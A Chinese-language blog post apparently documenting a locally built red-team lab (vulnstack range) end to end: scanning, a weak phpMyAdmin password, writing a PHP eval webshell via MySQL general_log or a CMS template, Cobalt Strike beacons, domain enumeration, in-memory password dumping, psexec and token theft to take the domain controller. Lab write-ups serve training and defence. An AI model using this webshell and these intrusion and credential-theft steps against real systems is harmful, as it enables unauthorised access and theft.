<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>ATT&amp;CK红队实战(一) | Hui's Blog</title><script src="https://cdn.bootcss.com/valine/1.4.4/Valine.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Hui's Blog" type="application/atom+xml">
</head><body><header><nav><a href="/">Home</a><a href="/archives/">Archives</a></nav></header><main><article><div id="post-bg"><div id="post-title"><h1>ATT&amp;CK红队实战(一)</h1><hr></div><div id="post-content"><h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>靶场地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
<blockquote>
<p>一共有三台靶机 （Win7、Server08、Server03）</p>
</blockquote>
<h3 id="拓扑结构"><a href="#拓扑结构" class="headerlink" title="拓扑结构"></a>拓扑结构</h3><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306093726591.png" alt="image-20210306093726591"></p>
<ul>
<li>可以看出Win7是通外网的Web服务器，且与Server08、Server03处于内网环境中</li>
<li>将Kali设置NAT模式，Win7设置两张网卡（一张NAT模式，一张仅主机模式），Server08、Server03均为仅主机模式。</li>
</ul>
<h3 id="环境测试"><a href="#环境测试" class="headerlink" title="环境测试"></a>环境测试</h3><blockquote>
<p>Win7 Ping可以Ping得通所有靶机，所有靶机Ping不通Win7（防火墙有icmp过滤）</p>
</blockquote>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306094935302.png" alt="image-20210306094935302"></p>
<h2 id="渗透攻击"><a href="#渗透攻击" class="headerlink" title="渗透攻击"></a>渗透攻击</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><ul>
<li>1） 使用nmap扫描网段内存活主机</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP -n 192.168.100.0&#x2F;24</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306100310985.png" alt="image-20210306100310985"></p>
<ul>
<li>2） 使用 netdiscover二层发现工具</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.100.0&#x2F;24</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306100941372.png" alt="image-20210306100941372"></p>
<ul>
<li><ol start="3">
<li>扫描到ip后使用nmap查找靶机具体开放的端口</li>
</ol>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -n -p- 192.168.100.128</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306102651706.png" alt="image-20210306102651706"></p>
<blockquote>
<p>靶机开放了80和3306端口</p>
</blockquote>
<p>这时候访问80端口发现是一个phpStudy探针的页面</p>
<p>网站绝对路径为：<code>C:/phpStudy/www/</code></p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306103033113.png" alt="image-20210306103033113"></p>
<p>使用御剑扫描<code>80端口</code>发现了一个<code>phpmyadmin</code>目录和一个<code>beifen.rar</code>的文件</p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306135915736.png" alt="image-20210306135915736"></p>
<p>把<code>beifen.rar</code>文件下载下来发现是一个yxcms的源码</p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306140314295.png" alt="image-20210306140314295"></p>
<p>这时候就有两种攻击思路：</p>
<ul>
<li>利用phpmyadmin进行写马然后getshell （能登陆能写）</li>
<li>审计yxcms看看有没有漏洞getshell</li>
</ul>
<p>因为是本地搭建的，我就把两种渗透方法都操作一遍。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="1）phpmyadmin-日志提权"><a href="#1）phpmyadmin-日志提权" class="headerlink" title="1）phpmyadmin 日志提权"></a>1）phpmyadmin 日志提权</h4><p>访问phpmyadmin尝试登陆发现弱密码<code>root:root</code></p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306144146362.png" alt="image-20210306144146362"></p>
<p>先查看有没有写入的权限</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306141523412.png" alt="image-20210306141523412"></p>
<p>该参数用于限制<code>select...into outfile...</code>、<code>load_file()</code>导出到或读取哪个指定的目录。当该参数为NULL时，则表示mysql不允许导入导出。</p>
<p>这里为NULL我们可以尝试利用log日志来写入webshell</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306142422614.png" alt="image-20210306142422614"></p>
<ul>
<li><p>general_log 指定日志保存状态（ON/OFF）</p>
</li>
<li><p>general_log_file 指定保存日志的路径</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global general_log &#x3D; &quot;ON&quot;; 	# 开启日志记录</span><br><span class="line">set global general_log_file&#x3D;&quot;C:\\phpStudy\\www\\ey404.php&quot;;  # 指定日志文件</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306142900452.png" alt="image-20210306142900452"></p>
<p>这时候select查询一句话木马的内容会被写入日志文件中，再使用菜刀连接</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php eval($_POST[&quot;404&quot;]);?&gt;&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306143229287.png" alt="image-20210306143229287"></p>
<p>使用菜刀连接</p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306143620423.png" alt="image-20210306143620423"></p>
<p>成功拿到shell</p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306143338110.png" alt="image-20210306143338110"></p>
<h4 id="2-yxcms源码泄露"><a href="#2-yxcms源码泄露" class="headerlink" title="2) yxcms源码泄露"></a>2) yxcms源码泄露</h4><p>访问yxcms网站发现首页有泄露后台网址和密码</p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306143933362.png" alt="image-20210306143933362"></p>
<p>后台登陆后发现前台模板可以编辑，随意找到一模板进去编辑</p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306144433951.png" alt="image-20210306144433951"></p>
<p>插入一句话木马</p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306144526074.png" alt="image-20210306144526074"></p>
<p>通过下载的源码找到编写<code>acomment.php</code>的路径</p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306144656837.png" alt="image-20210306144656837"></p>
<p>使用菜刀连接</p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306144838186.png" alt="image-20210306144838186"></p>
<p>获取shell</p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306144904217.png" alt="image-20210306144904217"></p>
<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="使用Cobalt-Strike"><a href="#使用Cobalt-Strike" class="headerlink" title="使用Cobalt Strike"></a>使用Cobalt Strike</h3><ul>
<li>使用CS的前提是获得一个shell，刚好我们菜刀上有shell</li>
</ul>
<p>cs服务器在kali上使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 teamserver</span><br><span class="line">.&#x2F;teamserver 192.168.100.177 password</span><br><span class="line">.&#x2F;start.sh</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306145624431.png" alt="image-20210306145624431"></p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306145804122.png" alt="image-20210306145804122"></p>
<p>先新建一个Listeners监听</p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306150433279.png" alt="image-20210306150433279"></p>
<p>生成Web Delivery</p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306150723941.png" alt="image-20210306150723941"></p>
<p>把这一段复制到菜刀上执行，然后等待主机上线即可</p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306150856264.png" alt="image-20210306150856264"></p>
<p>菜刀上执行CS获取shell</p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306151030279.png" alt="image-20210306151030279"></p>
<h3 id="内网-信息收集"><a href="#内网-信息收集" class="headerlink" title="内网 - 信息收集"></a>内网 - 信息收集</h3><ul>
<li>CS拿到shell默认心跳值为<code>60s</code>，因为这里是自己的内网，就把心跳值设置为0s(这里输入sleep 0 后需要先等待60s即可)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep 0</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306151641088.png" alt="image-20210306151641088"></p>
<p>查看主机的一些基本信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell whoami</span><br><span class="line">shell ipconfig &#x2F;all</span><br><span class="line">shell net user</span><br><span class="line">shell net localgroup administrators</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306152349314.png" alt="image-20210306152349314"></p>
<p><code>systeminfo</code> 查看详细系统详细</p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306152538200.png" alt="image-20210306152538200"></p>
<h3 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h3><ul>
<li>何为域：</li>
</ul>
<blockquote>
<p>域是Windows网络中独立运行的单位，域之间访问需要建立一个信任关系，信任关系是连接域与域的一个桥梁。当一个域与其它域建立了信任关系后，2个域可以进行互相管理，也可以跨网进行资源共享。</p>
</blockquote>
<ul>
<li>常用的域信息收集命令</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain computers&quot; &#x2F;domain    #列出该域内所有机器名</span><br><span class="line">net user &#x2F;domain						#列出该域内所有用户名</span><br><span class="line">net group &#x2F;domain						#列出域里面的工作组</span><br><span class="line">net time &#x2F;domain						#判断主域</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306161303539.png" alt="image-20210306161303539"></p>
<h2 id="横向探测"><a href="#横向探测" class="headerlink" title="横向探测"></a>横向探测</h2><p>右键一个beacon，<code>Port Scan</code>或者<code>net view</code>探测内网信息</p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306161429864.png" alt="image-20210306161429864"></p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306161815138.png" alt="image-20210306161815138"></p>
<p>点击这个图标可以查看探测到的主机信息</p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306161917520.png" alt="image-20210306161917520"></p>
<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h3 id="收集密码信息"><a href="#收集密码信息" class="headerlink" title="收集密码信息"></a>收集密码信息</h3><blockquote>
<p>从内存中导出系统密码</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logonpasswords</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306162207460.png" alt="image-20210306162207460"></p>
<p>点击这个图标可以查看获取到的密码信息</p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306162312129.png" alt="image-20210306162312129"></p>
<h3 id="建立隧道"><a href="#建立隧道" class="headerlink" title="建立隧道"></a>建立隧道</h3><blockquote>
<p>正常情况下kali（192.168.100.177）是连接不到Server08、03（192.168.50.0/24）这个网段的，所以就需要CS派生一个smb beacon,让内网的主机连接到Win7上</p>
</blockquote>
<p>新建一个<code>Lintener</code>，<code>payload</code>设置<code>Beacon SMB</code></p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306162703717.png" alt="image-20210306162703717"></p>
<h3 id="psexec使用凭证登陆到其他主机"><a href="#psexec使用凭证登陆到其他主机" class="headerlink" title="psexec使用凭证登陆到其他主机"></a>psexec使用凭证登陆到其他主机</h3><p>使用SMB建立连接</p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306163335209.png" alt="image-20210306163335209"></p>
<p>使用psexec登陆Server2003</p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306163802428.png" alt="image-20210306163802428"></p>
<p>Server03这里就登陆成功了</p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306165923860.png" alt="image-20210306165923860"></p>
<p>Server08同这样操作也可以获得<code>beacon</code>,这里使用另一种方法</p>
<h3 id="窃取token登陆到域控"><a href="#窃取token登陆到域控" class="headerlink" title="窃取token登陆到域控"></a>窃取token登陆到域控</h3><blockquote>
<p>通过窃取GOD\Administrator 的token来登陆Server08域控</p>
<p>先查看进程列表</p>
</blockquote>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306170656151.png" alt="image-20210306170656151"></p>
<blockquote>
<p>窃取token</p>
</blockquote>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306170502484.png" alt="image-20210306170502484"></p>
<blockquote>
<p>使用token登陆</p>
</blockquote>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306170858210.png" alt="image-20210306170858210"></p>
<blockquote>
<p>拿到域控的beacon权限</p>
</blockquote>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306171040378.png" alt="image-20210306171040378"></p>
<p>至此整个内网都渗透成功</p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306171357011.png" alt="image-20210306171357011"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>渗透过程中先通过mysql日志写马或者cms模板写马来拿下Web服务器，再通过Web服务器作为跳板，获取内网的信息，利用administrator的凭证或者token来登陆其它两台内网的靶机，最终拿到了所有靶机的权限。</p>
<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210306171322015.png" alt="image-20210306171322015"></p>
<div id="paginator"></div></div><div id="post-footer"><hr><a href="/2021/03/08/%E8%AE%B0%E4%B8%80%E6%AC%A1IPC-%E6%B8%97%E9%80%8F/">← Prev 记一次IPC$渗透</a><span style="color: #fe2"> | </span><a href="/2021/03/05/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/">内存取证分析 Next →</a><hr></div><div id="bottom-btn"><a id="to-index" href="#post-index" title="index">≡</a><a id="to-top" href="#post-title" title="to top">∧</a></div><div id="Valine"></div><script>new Valine({
 el: '#Valine'
 , appId: ''
 , appKey: ''
 , placeholder: '此条评论委托企鹅物流发送'
})</script></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/"> Dr.Hui</a></h1><section id="total"><a id="total-archives" href="/archives"><span class="total-title">Archives Total:</span><span class="total-number">15</span></a><div id="total-tags"><span class="total-title">Tags:</span><span class="total-number">20</span></div><div id="total-categories"><span class="total-title">Categories:</span><span class="total-number">6</span></div></section></div><div id="aside-block"></div><footer><nobr><span class="text-title">©</span><span class="text-content">1970 to 2020</span></nobr><wbr><nobr><span class="text-title">ICP</span><span class="text-content">——备案号——</span></nobr><wbr><wbr><nobr>published with&nbsp;<a target="_blank" rel="noopener" href="http://hexo.io">Hexo&nbsp;</a></nobr><wbr><nobr>Theme&nbsp;<a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknight&nbsp;</a></nobr><wbr><nobr>by&nbsp;<a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/arknights.js"></script><script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/highlight.min.js"></script></body></html>